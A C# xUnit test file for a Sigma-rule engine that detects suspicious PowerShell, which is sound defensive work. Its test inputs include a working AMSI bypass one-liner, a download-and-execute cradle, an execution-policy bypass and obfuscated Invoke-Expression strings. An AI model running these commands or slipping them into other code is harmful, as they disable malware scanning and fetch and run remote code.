using Downpour.Service;
using Xunit;

namespace Downpour.Tests;

public sealed class SigmaEngineTests
{
    [Fact]
    public void GetBuiltinRules_ReturnsExpectedRules()
    {
        var rules = SigmaEngine.GetBuiltinRules();

        Assert.NotEmpty(rules);
        Assert.Contains(rules, r => r.Id == "sigma-powershell-encoded-command");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-bypass");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-download-cradle");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-obfuscation");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-amsi-bypass");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-wmi");
    }

    [Fact]
    public void LoadFromYaml_ParsesValidYaml()
    {
        const string yaml = """
            ---
            id: "test-rule"
            title: "Test Rule"
            level: "high"
            description: "Test description"
            tags: ["tag1", "tag2"]
            detection:
              detection1:
                contains: "test"
              condition: detection1
            """;

        var rules = SigmaEngine.LoadFromYaml(yaml);

        Assert.Single(rules);
        Assert.Equal("test-rule", rules[0].Id);
        Assert.Equal("Test Rule", rules[0].Title);
        Assert.Equal("high", rules[0].Level);
        Assert.Equal("Test description", rules[0].Description);
        Assert.Equal(["tag1", "tag2"], rules[0].Tags);
        Assert.Single(rules[0].Detection);
    }

    [Fact]
    public void LoadFromYaml_RejectsMalformedYaml()
    {
        const string yaml = "invalid: yaml: [unclosed";

        var rules = SigmaEngine.LoadFromYaml(yaml);

        Assert.Empty(rules);
    }

    [Fact]
    public void Match_DetectsEncodedCommand()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "powershell -EncodedCommand SQBFAFgAIAAoACcAdABlAHMAdAAnACkA";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-encoded-command");
    }

    [Fact]
    public void Match_DetectsExecutionPolicyBypass()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "powershell -ExecutionPolicy Bypass -Command \"Write-Host test\"";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-bypass");
    }

    [Fact]
    public void Match_DetectsDownloadCradle()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-download-cradle");
    }

    [Fact]
    public void Match_DetectsObfuscation()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "Invoke-Expression ([string]::Join('',[char[]](97,98,99))).Replace('a','b')";

        var matches = SigmaEngine.Match(text, rules);
        
        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-obfuscation");
    }

    [Fact]
    public void Match_DetectsAmsiBypass()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-amsi-bypass");
    }

    [Fact]
    public void Match_DetectsWmi()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "Get-WmiObject -Class Win32_Process -Namespace root\\cimv2";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-wmi");
    }

    [Fact]
    public void Match_ReturnsEmptyForCleanText()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "Write-Host 'Hello World'";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Empty(matches);
    }

    [Fact]
    public void Match_ReturnsEmptyForNullOrEmptyInput()
    {
        var rules = SigmaEngine.GetBuiltinRules();

        Assert.Empty(SigmaEngine.Match("", rules));
        Assert.Empty(SigmaEngine.Match(null, rules));
        Assert.Empty(SigmaEngine.Match("test", null));
    }

    [Fact]
    public void Match_ReturnsMatchDetails()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "powershell -encodedcommand test";

        var matches = SigmaEngine.Match(text, rules);

        var match = Assert.Single(matches);
        Assert.Equal("sigma-powershell-encoded-command", match.RuleId);
        Assert.Equal("PowerShell Encoded Command", match.RuleTitle);
        Assert.Equal("high", match.Level);
        Assert.Equal("-encodedcommand", match.MatchedText);
        Assert.True(match.MatchIndex >= 0);
    }

    [Fact]
    public void LoadFromYamlFiles_LoadsMultipleFiles()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "sigma-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempDir);
        try
        {
            File.WriteAllText(Path.Combine(tempDir, "rule1.yaml"), """
                ---
                id: "file-rule-1"
                title: "File Rule 1"
                level: "medium"
                detection:
                  test:
                    contains: "test"
                  condition: test
                """);
            File.WriteAllText(Path.Combine(tempDir, "rule2.yaml"), """
                ---
                id: "file-rule-2"
                title: "File Rule 2"
                level: "low"
                detection:
                  test:
                    contains: "example"
                  condition: test
                """);

            var rules = SigmaEngine.LoadFromYamlFiles(new[] { Path.Combine(tempDir, "rule1.yaml"), Path.Combine(tempDir, "rule2.yaml") });

            Assert.Equal(2, rules.Count);
            Assert.Contains(rules, r => r.Id == "file-rule-1");
            Assert.Contains(rules, r => r.Id == "file-rule-2");
        }
        finally
        {
            Directory.Delete(tempDir, true);
        }
    }
}